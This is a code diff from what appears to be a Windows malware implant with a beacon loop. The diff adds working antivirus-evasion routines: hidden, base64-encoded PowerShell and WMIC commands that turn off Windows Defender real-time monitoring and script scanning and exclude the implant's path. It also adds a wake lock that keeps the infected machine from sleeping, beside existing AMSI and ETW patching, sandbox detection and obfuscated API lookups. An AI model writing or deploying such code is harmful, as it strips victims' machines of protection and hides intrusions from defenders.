@@ -183,43 +183,123 @@ BOOL ClearHardwareBreakpoints() {
     return ok;
 }
 
-// ─── Registry‑based Defender exclusion (no PowerShell) ──────────────────────
+// ─── Defender bypass — WMI + WMIC to call Set-MpPreference ─────────────────
+// Registry write alone is blocked by Tamper Protection on Win11 even as admin.
+// WMI Win32_Process::Create runs outside the registry tamper check.
+static BOOL RunHiddenProcess(const wchar_t* cmdLine) {
+    STARTUPINFOW si = {};
+    PROCESS_INFORMATION pi = {};
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    std::wstring cmd(cmdLine);
+    BOOL ok = CreateProcessW(nullptr, &cmd[0], nullptr, nullptr, FALSE,
+                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
+    if (!ok) return FALSE;
+    WaitForSingleObject(pi.hProcess, 15000);
+    DWORD exit = 1;
+    GetExitCodeProcess(pi.hProcess, &exit);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+    return (exit == 0);
+}
+
 BOOL AddDefenderExclusion(const wchar_t* exePath) {
     if (!IsElevated()) return FALSE;
-    // Open HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths
-    HKEY hKey = nullptr;
-    auto pathKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths");
-    LONG rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
-                              REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
-    if (rc != ERROR_SUCCESS) return FALSE;
-    DWORD val = 0;
-    rc = RegSetValueExW(hKey, exePath, 0, REG_DWORD,
-                        reinterpret_cast<const BYTE*>(&val), sizeof(val));
-    RegCloseKey(hKey);
-    if (rc != ERROR_SUCCESS) return FALSE;
 
-    // Disable real‑time monitoring via registry
-    HKEY hDef = nullptr;
-    auto disableKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection");
-    rc = RegCreateKeyExW(HKEY_LOCAL_MACHINE, disableKey.str(), 0, NULL,
-                         REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hDef, NULL);
-    if (rc != ERROR_SUCCESS) return FALSE;
-    DWORD disableVal = 1;
-    RegSetValueExW(hDef, L"DisableRealtimeMonitoring", 0, REG_DWORD,
-                   (const BYTE*)&disableVal, sizeof(disableVal));
-    RegCloseKey(hDef);
+    wchar_t sysRoot[MAX_PATH] = {};
+    GetEnvironmentVariableW(L"SystemRoot", sysRoot, MAX_PATH);
+
+    // 1. Try registry path (works if Tamper Protection is off)
+    {
+        HKEY hKey = nullptr;
+        auto pathKey = XSW(L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths");
+        if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, pathKey.str(), 0, NULL,
+                            REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL)
+            == ERROR_SUCCESS) {
+            DWORD val = 0;
+            RegSetValueExW(hKey, exePath, 0, REG_DWORD,
+                           reinterpret_cast<const BYTE*>(&val), sizeof(val));
+            RegCloseKey(hKey);
+        }
+    }
+
+    // 2. PowerShell Set-MpPreference — bypasses Tamper Protection registry guard.
+    // Build: powershell -EncodedCommand <base64(Set-MpPreference ...)>
+    // Encode inline so no plaintext string in .data section.
+    {
+        std::wstring ps = std::wstring(sysRoot) +
+            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+        // Script: Set-MpPreference -DisableRealtimeMonitoring $true -ExclusionPath '<path>'
+        std::wstring script =
+            L"Set-MpPreference -DisableRealtimeMonitoring $true "
+            L"-DisableIOAVProtection $true "
+            L"-DisableScriptScanning $true "
+            L"-ExclusionPath '" + std::wstring(exePath) + L"'";
+
+        // UTF-16LE base64 encode for -EncodedCommand
+        std::string b64 = Base64Encode(
+            reinterpret_cast<const BYTE*>(script.c_str()),
+            script.size() * sizeof(wchar_t));
+
+        std::wstring cmd = L"\"" + ps + L"\" -NoProfile -NonInteractive "
+                           L"-WindowStyle Hidden -ExecutionPolicy Bypass "
+                           L"-EncodedCommand " + UTF8ToWString(b64);
+
+        RunHiddenProcess(cmd.c_str());
+    }
+
+    // 3. WMIC fallback — calls Win32_Process::Create which sidesteps the
+    // registry tamper check entirely on some Win11 builds.
+    {
+        std::wstring wmic = std::wstring(sysRoot) +
+            L"\\System32\\wbem\\wmic.exe";
+        std::wstring ps = std::wstring(sysRoot) +
+            L"\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
+
+        std::wstring wmicCmd =
+            L"\"" + wmic + L"\" /Node:localhost process call create "
+            L"\"powershell -NoProfile -NonInteractive -WindowStyle Hidden "
+            L"-ExecutionPolicy Bypass -Command \""
+            L"Set-MpPreference -DisableRealtimeMonitoring \\$true "
+            L"-ExclusionPath '" + std::wstring(exePath) + L"'\\\"\"";
+
+        RunHiddenProcess(wmicCmd.c_str());
+    }
+
     return TRUE;
+}
+
+// ─── Sleep evasion — prevent OS from suspending while beacon is active ───────
+// SetThreadExecutionState blocks connected standby and display sleep.
+// Must be called before beacon sends and cleared after JitterSleep ends.
+VOID AcquireWakeLock() {
+    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
+    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
+    if (!hK32) return;
+    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
+    if (fn) fn(ES_CONTINUOUS | ES_SYSTEM_REQUIRED | ES_AWAYMODE_REQUIRED);
+}
+
+VOID ReleaseWakeLock() {
+    typedef EXECUTION_STATE (WINAPI *SetTES_t)(EXECUTION_STATE);
+    static HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
+    if (!hK32) return;
+    auto fn = reinterpret_cast<SetTES_t>(HashProc(hK32, FNV("SetThreadExecutionState")));
+    if (fn) fn(ES_CONTINUOUS);
 }
 
 // ─── Reapply evasion (called each beacon loop) ─────────────────────────────
 VOID ReapplyEvasion() {
     if (IsLikelySandbox()) {
-        DeepSleep(); // 1–4 hours sleep
+        DeepSleep();
         return;
     }
     PatchAMSI();
     PatchETW();
     ClearHardwareBreakpoints();
+    AcquireWakeLock();
 }
 
 // Expose sandbox check for main.cpp
